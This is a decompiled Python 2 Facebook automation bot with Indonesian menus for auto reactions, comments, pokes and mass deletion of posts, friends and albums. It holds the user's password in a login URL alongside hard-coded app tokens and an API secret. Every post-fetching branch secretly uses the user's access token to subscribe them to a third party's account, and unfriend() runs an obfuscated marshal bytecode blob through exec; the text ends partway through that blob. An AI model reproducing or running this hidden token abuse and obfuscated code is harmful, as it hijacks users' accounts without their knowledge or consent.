
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Source File : Bot.py
# Time : Sat Aug 22 08:00:16 2020
#---------------------------------------
# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <debby>
import json, sys, hashlib, os, time, marshal, getpass, urllib, random, sys, time

def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.3)


import requests, platform, os

def tampil(x):
    w = {'m': 31, 'h': 32, 'k': 33, 'b': 34, 'p': 35, 'c': 36}
    for i in w:
        x = x.replace('\r%s' % i, '\x1b[%s;1m' % w[i])

    x += '\x1b[0m'
    x = x.replace('\r0', '\x1b[0m')
    print x


if sys.platform in ('linux', 'linux2'):
    W = '\x1b[0m'
    G = '\x1b[32;1m'
    R = '\x1b[31;1m'
else:
    W = ''
    G = ''
    R = ''
reload(sys)
sys.setdefaultencoding('utf8')
jml = []
jmlgetdata = []
n = []
tampil('\rh\n          ___   ___   _  _   \n         | __| | _ ) | || |  \rk*\rcAsecC|~|eror404\n         | _|  | _ \\ | __ |  \n        _|_|_  |___/ |_||_|  \n \rp |"""""|| """ |\rmHaxID\rp|"""""||"""""| \n      "`-0-0-\'"`-0-0-\'"`-0-0-\'   \n      \n\rmKita semua bangkit dan berdiri untuk suatu perubahan\n\rc####################################################\n                  \rh*\rpFB BOT\rh*\n             \t\t\n \rhAuthor :\x1b[36;1m AsecC\rm|~|\rheror404\n \rhTeam   :\x1b[36;1m Hax\rhID\n \rhContact:\x1b[36;1m sempakbasah\rm044\rh@gmail.com\n \n\rc####################################################\n\rmNOTE:Sekali anda memahami, seribu kali anda mengerti')
tampil('')
tampil('')
tampil('\rc#\rpLogin dulu bosq\rk*')
idt = raw_input('\x1b[32;1m[\x1b[31m*\x1b[32;1m] \x1b[36;1mEmail/No ponsel   : ')
passw = raw_input('\x1b[32;1m[\x1b[31m*\x1b[32;1m] \x1b[36;1mPassword: ')
url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idt + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op:
    token = op['access_token']
    print '\x1b[32;1m[\x1b[31m+\x1b[36;1m] Mantap login sukses\x1b[32;1m*'
else:
    print '\x1b[32;1m[\x1b[31m+\x1b[32;1m] \x1b[31mlogin gagal bosq silahkan coba lagi\x1b[32;1m*!'
    sys.exit()
    main()

def menu():
    print '\n                     %s*\x1b[31;1m\x1b[34;1mFBH BOT\x1b[31;1m*%s\n     \x1b[36;1m----------------------------------------\n     \n             \x1b[32;1m[\x1b[31;1m001. \x1b[36;1mLogin            \x1b[32;1m]\n             \x1b[32;1m[\x1b[31;1m002. \x1b[36;1mMenu Bot         \x1b[32;1m]\n    \n                \x1b[32;1m*\x1b[35;1mWajib Login Dulu\x1b[32;1m*\n             \n             \x1b[32;1m[\x1b[36;1m000. \x1b[31;1mKeluar           \x1b[32;1m]\n             \n     \x1b[36;1m----------------------------------------\n    ' % (G, W)


def menu_bot():
    print '\n                  %s\x1b[31;1mMENU BOT%s\n\n   \x1b[32;1m[\x1b[31;1m01. \x1b[32;1mAuto Reactions                       ]\n   \x1b[32;1m[\x1b[31;1m02. \x1b[32;1mAuto Komentar                        ]\n   \x1b[32;1m[\x1b[31;1m03. \x1b[32;1mAuto Poke                            ]\n   \x1b[32;1m[\x1b[31;1m04. \x1b[32;1mTerima semua permintaan pertemanan   ]\n   \x1b[32;1m[\x1b[31;1m05. \x1b[32;1mHapus Semua Postingan Di Timline     ]\n   \x1b[32;1m[\x1b[31;1m06. \x1b[32;1mHapus semua teman                    ]\n   \x1b[32;1m[\x1b[31;1m07. \x1b[32;1mBerhenti mengikuti semua teman       ]\n   \x1b[32;1m[\x1b[31;1m08. \x1b[32;1mHapus semua foto albums              ]\n\n   \x1b[32;1m[\x1b[36;1m000. \x1b[31;1mKeluar                      ]\n' % (G, W)


def menu_reaction():
    print "\n                %s\x1b[31;1mMENU REACTION%s\n\n   \x1b[32;1m[\x1b[31;1m1. \x1b[36;1mLike                      \x1b[32;1m]\n   \x1b[32;1m[\x1b[31;1m2. \x1b[36;1mReaction \x1b[31;1m'LOVE'  \x1b[32;1m]\n   \x1b[32;1m[\x1b[31;1m3. \x1b[36;1mReaction \x1b[31;1m'WOW'   \x1b[32;1m]\n   \x1b[32;1m[\x1b[31;1m4. \x1b[36;1mReaction \x1b[31;1m'HAHA'  \x1b[32;1m]\n   \x1b[32;1m[\x1b[31;1m5. \x1b[36;1mReaction \x1b[31;1m'SAD'   \x1b[32;1m]\n   \x1b[32;1m[\x1b[31;1m6. \x1b[36;1mReaction \x1b[31;1m'ANGRY' \x1b[32;1m]\n\n   \x1b[32;1m[\x1b[31;1m0. \x1b[32;1mKembali ke Menu Bot       \x1b[32;1m]\n" % (G, W)


def get(data):
    global id
    print '\x1b[32;1m[*] \x1b[32;1mGenerate access token '
    try:
        os.mkdir('cookie')
    except OSError:
        pass

    b = open('cookie/token.log', 'w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php', params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print '\x1b[36;1m[*] \x1b[32;1msuccessfully generate access token'
        print '\x1b[36;1m[*] \x1b[32;1mYour access token is stored in cookie/token.log'
        exit()
    except KeyError:
        print '\x1b[31;1m[!] Failed to generate access token'
        print '\x1b[31;1m[!] Check your connection / email or password'
        os.remove('cookie/token.log')
        id()
        menu()
        main()
    except requests.exceptions.ConnectionError:
        print '\x1b[31;1m[!] Failed to generate access token'
        print '\x1b[31;1m[!] Connection error !!!'
        os.remove('cookie/token.log')
        id()
        main()
        menu()


def id():
    print '\x1b[31;1m[*] \x1b[36;1mlogin to your facebook account         '
    id = raw_input('\x1b[31;1m[?] \x1b[32;1mUsername : ')
    pwd = getpass.getpass('\x1b[31;1m[?] \x1b[32;1mPassword : ')
    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
    data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
    x = hashlib.new('md5')
    x.update(sig)
    data.update({'sig': x.hexdigest()})
    get(data)


def post():
    global token
    try:
        if WT == 'wallpost':
            print '\x1b[32;1m[*] Mengambil semua id posting'
            r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token=' + token)
            requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
            result = json.loads(r.text)
            for i in result['home']['data']:
                print '\r\x1b[36;1m[*] %s Diambil   ' % i['id'],
                sys.stdout.flush()
                time.sleep(0.1)

            return result['home']['data']
        else:
            if WT == 'me':
                print '\x1b[32;1m[*] Mengambil semua id posting'
                r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_token=' + token)
                requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
                result = json.loads(r.text)
                for i in result['feed']['data']:
                    print '\r\x1b[36;1m[*] %s Diambil   ' % i['id'],
                    sys.stdout.flush()
                    time.sleep(0.1)

                return result['feed']['data']
            if WT == 'req':
                print '\x1b[32;1m[*] Mengambil semua permintaan teman'
                r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token)
                requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
                result = json.loads(r.text)
                for i in result['data']:
                    print '\r\x1b[36;1m[*] %s Diambil    ' % i['from']['id'],
                    sys.stdout.flush()
                    time.sleep(0.01)

                return result['data']
            if WT == 'friends':
                print '\x1b[32;1m[*] Mengambil semua id teman'
                r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token)
                requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
                result = json.loads(r.text)
                for i in result['friends']['data']:
                    print '\r\x1b[36;1m[*] %s Diambil    ' % i['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                return result['friends']['data']
            if WT == 'subs':
                print '\x1b[32;1m[*] Mengambil semua id teman'
                r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token=' + token)
                requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
                result = json.loads(r.text)
                for i in result['data']:
                    print '\r\x1b[32;1m[*] %s Diambil    ' % i['id'],
                    sys.stdout.flush()
                    time.sleep(0.01)

                return result
            if WT == 'albums':
                print '\x1b[32;1m[*] Mengambil semua id album'
                r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_token=' + token)
                requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
                result = json.loads(r.text)
                for i in result['albums']['data']:
                    print '\r\x1b[36;1m[*] %s Diambil    ' % i['id'],
                    sys.stdout.flush()
                    time.sleep(0.001)

                return result['albums']['data']
            print '\x1b[32;1m[*] Mengambil semua id postingan'
            r = requests.get('https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s' % (id, token))
            requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
            result = json.loads(r.text)
            for i in result['feed']['data']:
                print '\r\x1b[32;1m[*] %s Diambil   ' % i['id'],
                sys.stdout.flush()
                time.sleep(0.1)

            return result['feed']['data']

    except KeyError:
        print '\x1b[31;1m[!] Gagal mengambil semua id post'
        print '\x1b[31;1m[!] Berhenti'
        bot()
    except requests.exceptions.ConnectionError:
        print '\x1b[31;1m[!] Koneksi eror'
        print '\x1b[31;1m[!] Berhenti'
        bot()
    except KeyboardInterrupt:
        print '\x1b[31;1m[!] Berhenti'
        menu_bot()
        bot()


def like(posts, amount):
    print '\x1b[32;1m[*] Semua kiriman id berhasil diambil            '
    print '\x1b[32;1m[*] Semua Kiriman id berhasil di ambil'
    try:
        counter = 0
        for post in posts:
            if counter >= amount:
                break
            else:
                counter += 1
            parameters = {'access_token': token, 'type': type}
            url = ('https://graph.facebook.com/{0}/reactions').format(post['id'])
            s = requests.post(url, data=parameters)
            id = post['id'].split('_')[0]
            try:
                print '\r' + W + '[' + G + id + W + '] ' + post['message'][:40].replace('\n', ' ') + '...'
            except KeyError:
                try:
                    print '\r' + W + '[' + G + id + W + '] ' + post['story'].replace('\n', ' ')
                except KeyError:
                    print '\r' + W + '[' + G + id + W + '] Berhasil disukai'

        print '\x1b[32;1m[*] \x1b[32;1mSelesai                   '
        menu_reaction_ask()
    except KeyboardInterrupt:
        print '\x1b[31;1m[!] Berhenti                     '
        menu_reaction_ask()


def comment(posts, amount):
    print '\x1b[31;1m[*] \x1b[32;1mSemua kiriman id berhasil diambil          '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts:
            if counter >= amount:
                break
            else:
                counter += 1
            parameters = {'access_token': token, 'message': message}
            url = ('https://graph.facebook.com/{0}/comments').format(post['id'])
            s = requests.post(url, data=parameters)
            id = post['id'].split('_')[0]
            try:
                print W + '[' + G + id + W + '] ' + post['message'][:40].replace('\n', ' ') + '...'
            except KeyError:
                try:
                    print W + '[' + G + id + W + '] ' + post['story'].replace('\n', ' ')
                except KeyError:
                    print W + '[' + G + id + W + '] Berhasil berkomentar'

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\x1b[31;1m[!] Berhenti'
        menu_bot()
        bot()


def remove(posts):
    print '\r\x1b[31;1m[*] \x1b[32;1mSemua kiriman id berhasil diambil          '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            r = requests.post(('https://graph.facebook.com/{id}?method=delete&access_token={token}').format(id=post['id'], token=token))
            a = json.loads(r.text)
            try:
                cek = a['error']['message']
                print W + '[' + R + post['id'] + W + '] Gagal'
            except TypeError:
                print W + '[' + G + post['id'] + W + '] Dihapus'
                counter += 1

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\x1b[31;1m[!] Berhenti'
        menu_bot()
        bot()


def confirm(posts):
    print '\x1b[31;1m[*] \x1b[32;1mSemua permintaan teman berhasil diambil        '
    print '\x1b[31;1m[*] \x1b[32;1mMulai'
    try:
        counter = 0
        for post in posts:
            if counter >= 50:
                break
            else:
                counter += 1
            r = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s' % (post['from']['id'], token))
            a = json.loads(r.text)
            try:
                cek = a['error']['message']
                print W + '[' + R + post['from']['name'] + W + '] Gagal'
            except TypeError:
                print W + '[' + G + post['from']['name'] + W + '] Dikonfirmasi'

        print '\x1b[31;1m[*] \x1b[32;1mSelesai'
        menu_bot()
        bot()
    except KeyboardInterrupt:
        print '\x1b[32;1m[!] \x1b[31;1mBerhenti'
        menu_bot()
        bot()


def unfriend(posts):
    exec marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\xf5\x12\x00\x00@\x00\x00\x00s\x89<\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x02\x00d\x03\x00d\x04\x00d\x05\x00d\x06\x00d\x07\x00d\x08\x00d\t\x00d\n\x00d\x0b\x00d\x0c\x00d\r\x00d\x0e\x00d\x0f\x00d\x10\x00d\x11\x00d\x12\x00d\x13\x00d\x14\x00d\x15\x00d\x16\x00d\x17\x00d\x18\x00d\x19\x00d\x1a\x00d\x1b\x00d\x1c\x00d\x1d\x00d\x1e\x00d\x1f\x00d \x00d!\x00d"\x00d#\x00d$\x00d%\x00d&\x00d\x18\x00d\'\x00d(\x00d)\x00d*\x00d\t\x00d+\x00d \x00d,\x00d\x0c\x00d-\x00d.\x00d/\x00d0\x00d \x00d1\x00d\x06\x00d2\x00d3\x00d4\x00d5\x00d6\x00d*\x00d7\x00d8\x00d9\x00d8\x00d:\x00d;\x00d<\x00d=\x00d-\x00d>\x00d?\x00d@\x00dA\x00d\x1a\x00dB\x00dC\x00dD\x00dE\x00d\x1b\x00d?\x00dF\x00dG\x00d$\x00dH\x00dI\x00dJ\x00dK\x00d\x10\x00d\x02\x00dL\x00dM\x00dN\x00dO\x00dP\x00dQ\x00dR\x00dS\x00dT\x00dU\x00dV\x00dW\x00d=\x00dX\x00d\x17\x00dY\x00dZ\x00d[\x00d\\\x00d+\x00d\x1c\x00d]\x00dU\x00d?\x00d^\x00d\\\x00d_\x00dO\x00d`\x00d\t\x00d\x0c\x00da\x00db\x00d\x06\x00dc\x00d9\x00dd\x00de\x00df\x00dg\x00d@\x00dh\x00di\x00d!\x00dj\x00dk\x00d\x19\x00d\x1b\x00dl\x00dm\x00d[\x00d9\x00dn\x00do\x00dH\x00d0\x00dp\x00d\x1e\x00dq\x00dr\x00ds\x00dn\x00d:\x00dB\x00d\x19\x00dt\x00d0\x00du\x00d\x19\x00d\x1f\x00dv\x00d0\x00d\x04\x00d\x1c\x00ds\x00dM\x00dZ\x00dw\x00d5\x00dx\x00dy\x00d\x0b\x00dz\x00d{\x00d|\x00d\x02\x00d}\x00d~\x00d\x7f\x00dI\x00d\x80\x00d\x81\x00dn\x00d\x82\x00d\\\x00d\x83\x00d\x84\x00dZ\x00d\x85\x00d\x86\x00d\x84\x00d\x87\x00d\x1c\x00d\x88\x00d\x89\x00d\x8a\x00d\x8b\x00d\x8c\x00d\x8d\x00d\x8e\x00d\x8f\x00d\x90\x00d\x91\x00d\x92\x00d\x93\x00d>\x00dp\x00d\x1a\x00dA\x00d\x94\x00d\x95\x00d<\x00d\x96\x00d\x19\x00d$\x00d\x1c\x00d\x1d\x00d\x97\x00d\x98\x00d\x99\x00dQ\x00d\x9a\x00dV\x00dA\x00dq\x00d\x97\x00d9\x00dV\x00dc\x00d\x9b\x00d\x9c\x00d\x9d\x00d\x9b\x00d\x9e\x00d\x9f\x00d\xa0\x00d\xa1\x00dA\x00dA\x00dH\x00d\xa2\x00d\xa3\x00d\x9e\x00d\xa4\x00d\xa5\x00d\x9d\x00d\xa6\x00d\xa7\x00d\x95\x00dr\x00d\xa5\x00d\'\x00d\xa8\x00dl\x00d\x18\x00d8\x00d\xa9\x00d\x8b\x00d~\x00d\x05\x00di\x00d[\x00d\x08\x00d\xaa\x00d\xab\x00d\xac\x00dV\x00d\xad\x00d\x0e\x00d\xae\x00dH\x00d\x11\x00d\xaf\x00d\xa9\x00d\xb0\x00d\x13\x00d/\x00d\x17\x00d\x18\x00d\xb1\x00d\x1a\x00d\x1b\x00d\xa6\x00d\x1d\x00d6\x00d\xac\x00d \x00d&\x00d\x1a\x00d#\x00d$\x00d\x9a\x00d&\x00d\x18\x00d\xb2\x00d(\x00d)\x00d\xb3\x00d\t\x00d+\x00d\xb4\x00d,\x00d\x0c\x00d\xb5\x00d.\x00d/\x00d\xb6\x00d \x00d1\x00d\xb7\x00d2\x00d3\x00d\xad\x00d5\x00d6\x00dj\x00d7\x00d8\x00d4\x00d8\x00d:\x00dD\x00d<\x00d=\x00d{\x00d>\x00d?\x00d\x99\x00dA\x00d\x1a\x00d~\x00dC\x00dD\x00d\x95\x00d\x1b\x00d?\x00d\xb8\x00dG\x00d$\x00d~\x00dI\x00dJ\x00d\xb9\x00d\x10\x00d\x02\x00dc\x00dM\x00dN\x00d\x1c\x00dP\x00dQ\x00dZ\x00dS\x00dT\x00d\xba\x00dV\x00dW\x00d\xbb\x00dX\x00d\x17\x00df\x00dZ\x00d[\x00d)\x00d+\x00d\x1c\x00d\x81\x00dU\x00d?\x00d\xb6\x00d\\\x00d_\x00dh\x00d`\x00d\t\x00d\xbc\x00da\x00db\x00d6\x00dc\x00d9\x00dR\x00de\x00df\x00d\xbd\x00d@\x00dh\x00d\x8a\x00d!\x00dj\x00d9\x00d\x19\x00d\x1b\x00d\xbe\x00dm\x00d[\x00d\xbf\x00dn\x00do\x00d\xc0\x00d0\x00dp\x00d\x98\x00dq\x00dr\x00dk\x00dn\x00d:\x00d{\x00d\x19\x00dt\x00d\x91\x00du\x00d\x19\x00d\xa3\x00dv\x00d0\x00d\x0f\x00d\x1c\x00ds\x00de\x00dZ\x00dw\x00d\xaa\x00dx\x00dy\x00de\x00dz\x00d{\x00d2\x00d\x02\x00d}\x00d\xc1\x00d\x7f\x00dI\x00d}\x00d\x81\x00dn\x00d\x8b\x00d\\\x00d\x83\x00d\x89\x00dZ\x00d\x85\x00dE\x00d\x84\x00d\x87\x00d\x05\x00d\x88\x00d\x89\x00d\xb7\x00d\x8b\x00d\x8c\x00d8\x00d\x8e\x00d\x8f\x00d{\x00d\x91\x00d\x92\x00d\xc2\x00d>\x00dp\x00d\xa7\x00dA\x00d\x94\x00d\x7f\x00d<\x00d\x96\x00d\xc3\x00d$\x00d\x1c\x00dG\x00d\x97\x00d\x98\x00d\xa4\x00dQ\x00d\x9a\x00d\xad\x00dA\x00dq\x00d\x04\x00d9\x00dV\x00d\xa6\x00d\x9b\x00d\x9c\x00dI\x00d\x9b\x00d\x9e\x00d\xc4\x00d\xa0\x00d\xa1\x00d\xb8\x00dA\x00dH\x00d\xc5\x00d\xa3\x00d\x9e\x00d/\x00d\xa5\x00d\x9d\x00d\x1d\x00d\xa7\x00d\x95\x00dc\x00d\xa5\x00d\'\x00d\xc6\x00dl\x00d\x18\x00d\xc7\x00d\xa9\x00d\x8b\x00d\xaa\x00d\x05\x00di\x00d\x14\x00d\x08\x00d\xaa\x00d\x1d\x00d\xac\x00dV\x00d(\x00d\x0e\x00d\xae\x00d\xa5\x00d\x11\x00d\xaf\x00d\xb4\x00d\xb0\x00d\x13\x00d0\x00d\x17\x00d\x18\x00d`\x00d\x1a\x00d\x1b\x00dA\x00d\x1d\x00d6\x00d>\x00d \x00d&\x00dl\x00d#\x00d$\x00dn\x00d&\x00d\x18\x00d\xb7\x00d(\x00d)\x00d\x12\x00d\t\x00d+\x00dt\x00d,\x00d\x0c\x00d6\x00d.\x00d/\x00d\xc0\x00d \x00d1\x00d\'\x00d2\x00d3\x00d\x8e\x00d5\x00d6\x00dE\x00d7\x00d8\x00d\xc8\x00d8\x00d:\x00d\xc9\x00d<\x00d=\x00d-\x00d>\x00d?\x00d \x00dA\x00d\x1a\x00d\xca\x00dC\x00dD\x00d/\x00d\x1b\x00d?\x00d8\x00dG\x00d$\x00dR\x00dI\x00dJ\x00d\xbb\x00d\x10\x00d\x02\x00dr\x00dM\x00dN\x00d\x8b\x00dP\x00dQ\x00d\xcb\x00dS\x00dT\x00d\xcc\x00dV\x00dW\x00d\x95\x00dX\x00d\x17\x00d\xcd\x00dZ\x00d[\x00d\x1d\x00d+\x00d\x1c\x00dY\x00dU\x00d?\x00d\x97\x00d\\\x00d_\x00d\xce\x00d`\x00d\t\x00dJ\x00da\x00db\x00d\x81\x00dc\x00d9\x00dG\x00de\x00df\x00d\xc4\x00d@\x00dh\x00d\x92\x00d!\x00dj\x00d\xcf\x00d\x19\x00d\x1b\x00di\x00dm\x00d[\x00dx\x00dn\x00do\x00d\x85\x00d0\x00dp\x00d\xd0\x00dq\x00dr\x00d\xcc\x00dn\x00d:\x00dA\x00d\x19\x00dt\x00d\xb1\x00du\x00d\x19\x00du\x00dv\x00d0\x00d\xab\x00d\x1c\x00ds\x00d\xd1\x00dZ\x00dw\x00d\xb4\x00dx\x00dy\x00d\xb3\x00dz\x00d{\x00d\x89\x00d\x02\x00d}\x00d&\x00d\x7f\x00dI\x00d^\x00d\x81\x00dn\x00dc\x00d\\\x00d\x83\x00dF\x00dZ\x00d\x85\x00d\xd2\x00d\x84\x00d\x87\x00d\xd3\x00d\x88\x00d\x89\x00d\\\x00d\x8b\x00d\x8c\x00d\xa7\x00d\x8e\x00d\x8f\x00d\x92\x00d\x91\x00d\x92\x00d\xca\x00d>\x00dp\x00d{\x00dA\x00d\x94\x00d\xd4\x00d<\x00d\x96\x00dA\x00d$\x00d\x1c\x00d\xa1\x00d\x97\x00d\x98\x00d\xcf\x00dQ\x00d\x9a\x00d\x8f\x00dA\x00dq\x00d\xa0\x00d9\x00dV\x00dM\x00d\x9b\x00d\x9c\x00d\xc0\x00d\x9b\x00d\x9e\x00d\t\x00d\xa0\x00d\xa1\x00d.\x00dA\x00dH\x00d\x88\x00d\xa3\x00d\x9e\x00d\x18\x00d\xa5\x00d\x9d\x00d\x89\x00d\xa7\x00d\x95\x00d\xd3\x00d\xa5\x00d\'\x00d;\x00dl\x00d\x18\x00d\xa9\x00d\xa9\x00d\x8b\x00d*\x00d\x05\x00di\x00dz\x00d\x08\x00d\xaa\x00d=\x00d\xac\x00dV\x00d\xd5\x00d\x0e\x00d\xae\x00d\xcb\x00d\x11\x00d\xaf\x00dK\x00d\xb0\x00d\x13\x00d\xd2\x00d\x17\x00d\x18\x00dB\x00d\x1a\x00d\x1b\x00d\xd6\x00d\x1d\x00d6\x00d\xd7\x00d \x00d&\x00d\xb0\x00d#\x00d$\x00d;\x00d&\x00d\x18\x00d=\x00d(\x00d)\x00d\xcb\x00d\t\x00d+\x00d \x00d,\x00d\x0c\x00d}\x00d.\x00d/\x00d\xd8\x00d \x00d1\x00d\xd9\x00d2\x00d3\x00d\x9c\x00d5\x00d6\x00d*\x00d7\x00d8\x00d(\x00d8\x00d:\x00d;\x00d<\x00d=\x00d-\x00d>\x00d?\x00d\xb6\x00dA\x00d\x1a\x00d\xa4\x00dC\x00dD\x00dD\x00d\x1b\x00d?\x00dF\x00dG\x00d$\x00d\x82\x00dI\x00dJ\x00dE\x00d\x10\x00d\x02\x00d(\x00dM\x00dN\x00dO\x00dP\x00dQ\x00d\xbd\x00dS\x00dT\x00d\xb9\x00dV\x00dW\x00d\xc7\x00dX\x00d\x17\x00dY\x00dZ\x00d[\x00d\\\x00d+\x00d\x1c\x00dN\x00dU\x00d?\x00d2\x00d\\\x00d_\x00d\x88\x00d`\x00d\t\x00d\x88\x00da\x00db\x00d\x06\x00dc\x00d9\x00d\x95\x00de\x00df\x00d\x81\x00d@\x00dh\x00d\xc0\x00d!\x00dj\x00di\x00d\x19\x00d\x1b\x00dj\x00dm\x00d[\x00d\xa1\x00dn\x00do\x00d\x94\x00d0\x00dp\x00d\xb8\x00dq\x00dr\x00d!\x00dn\x00d:\x00dd\x00d\x19\x00dt\x00d\x06\x00du\x00d\x19\x00d\xda\x00dv\x00d0\x00d\x14\x00d\x1c\x00ds\x00d\xa9\x00dZ\x00dw\x00d\xa4\x00dx\x00dy\x00d|\x00dz\x00d{\x00d\xcd\x00d\x02\x00d}\x00d{\x00d\x7f\x00dI\x00d\x11\x00d\x81\x00dn\x00d\x03\x00d\\\x00d\x83\x00d`\x00dZ\x00d\x85\x00d\xb7\x00d\x84\x00d\x87\x00d2\x00d\x88\x00d\x89\x00d\x8e\x00d\x8b\x00d\x8c\x00d\x8d\x00d\x8e\x00d\x8f\x00di\x00d\x91\x00d\x92\x00d3\x00d>\x00dp\x00d\x83\x00dA\x00d\x94\x00d\x0b\x00d<\x00d\x96\x00d/\x00d$\x00d\x1c\x00d\xd4\x00d\x97\x00d\x98\x00d\x11\x00dQ\x00d\x9a\x00d\x12\x00dA\x00dq\x00d\x97\x00d9\x00dV\x00d\x98\x00d\x9b\x00d\x9c\x00d!\x00d\x9b\x00d\x9e\x00dH\x00d\xa0\x00d\xa1\x00d\x88\x00dA\x00dH\x00d2\x00d\xa3\x00d\x9e\x00dA\x00d\xa5\x00d\x9d\x00d\xa6\x00d\xa7\x00d\x95\x00dU\x00d\xa5\x00d\'\x00d\n\x00dl\x00d\x18\x00d\xc6\x00d\xa9\x00d\x8b\x00dE\x00d\x05\x00di\x00d\x13\x00d\x08\x00d\xaa\x00ds\x00d\xac\x00dV\x00d|\x00d\x0e\x00d\xae\x00dI\x00d\x11\x00d\xaf\x00dg\x00d\xb0\x00d\x13\x00d[\x00d\x17\x00d\x18\x00di\x00d\x1a\x00d\x1b\x00d\xdb\x00d\x1d\x00d6\x00dn\x00d \x00d&\x00d1\x00d#\x00d$\x00d\x9a\x00d&\x00d\x18\x00da\x00d(\x00d)\x00d\x13\x00d\t\x00d+\x00d[\x00d,\x00d\x0c\x00d<\x00d.\x00d/\x00d\xd7\x00d \x00d1\x00d\xdc\x00d2\x00d3\x00dt\x00d5\x00d6\x00d\xdd\x00d7\x00d8\x00d\x05\x00d8\x00d:\x00d\x7f\x00d<\x00d=\x00dR\x00d>\x00d?\x00d+\x00dA\x00d\x1a\x00d~\x00dC\x00dD\x00d\xa3\x00d\x1b\x00d?\x00d\x84\x00dG\x00d$\x00d]\x00dI\x00dJ\x00d\x0c\x00d\x10\x00d\x02\x00d]\x00dM\x00dN\x00dR\x00dP\x00dQ\x00dZ\x00dS\x00dT\x00d\x06\x00dV\x00dW\x00d\xde\x00dX\x00d\x17\x00df\x00dZ\x00d[\x00d\xb1\x00d+\x00d\x1c\x00dE\x00dU\x00d?\x00d\xdf\x00d\\\x00d_\x00da\x00d`\x00d\t\x00d/\x00da\x00db\x00d6\x00dc\x00d9\x00d\xe0\x00de\x00df\x00dn\x00d@\x00dh\x00d\xb4\x00d!\x00dj\x00d\xd2\x00d\x19\x00d\x1b\x00d\xe1\x00dm\x00d[\x00d\xad\x00dn\x00do\x00d\xdb\x00d0\x00dp\x00d$\x00dq\x00dr\x00d\xc2\x00dn\x00d:\x00d\xd5\x00d\x19\x00dt\x00d\x8b\x00du\x00d\x19\x00dX\x00dv\x00d0\x00dZ\x00d\x1c\x00ds\x00d4\x00dZ\x00dw\x00d\xe2\x00dx\x00dy\x00d\x98\x00dz\x00d{\x00d\xa9\x00d\x02\x00d}\x00d\xe3\x00d\x7f\x00dI\x00dJ\x00d\x81\x00dn\x00d\x92\x00d\\\x00d\x83\x00dY\x00dZ\x00d\x85\x00d\xdb\x00d\x84\x00d\x87\x00d;\x00d\x88\x00d\x89\x00d\x88\x00d\x8b\x00d\x8c\x00dv\x00d\x8e\x00d\x8f\x00dH\x00d\x91\x00d\x92\x00d\x99\x00d>\x00dp\x00d\xd6\x00dA\x00d\x94\x00d\x96\x00d<\x00d\x96\x00d\xc3\x00d$\x00d\x1c\x00d9\x00d\x97\x00d\x98\x00dj\x00dQ\x00d\x9a\x00d\x0e\x00dA\x00dq\x00d\xe4\x00d9\x00dV\x00d\xe5\x00d\x9b\x00d\x9c\x00d#\x00d\x9b\x00d\x9e\x00d\x1a\x00d\xa0\x00d\xa1\x00d\xe6\x00dA\x00dH\x00d\x91\x00d\xa3\x00d\x9e\x00d(\x00d\xa5\x00d\x9d\x00d\xd0\x00d\xa7\x00d\x95\x00d#\x00d\xa5\x00d\'\x00d\xd4\x00dl\x00d\x18\x00d\x81\x00d\xa9\x00d\x8b\x00d\r\x00d\x05\x00di\x00dC\x00d\x08\x00d\xaa\x00d\x9b\x00d\xac\x00dV\x00d\x0b\x00d\x0e\x00d\xae\x00d3\x00d\x11\x00d\xaf\x00d[\x00d\xb0\x00d\x13\x00d\x8d\x00d\x17\x00d\x18\x00d\xd6\x00d\x1a\x00d\x1b\x00d|\x00d\x1d\x00d6\x00d\x9c\x00d 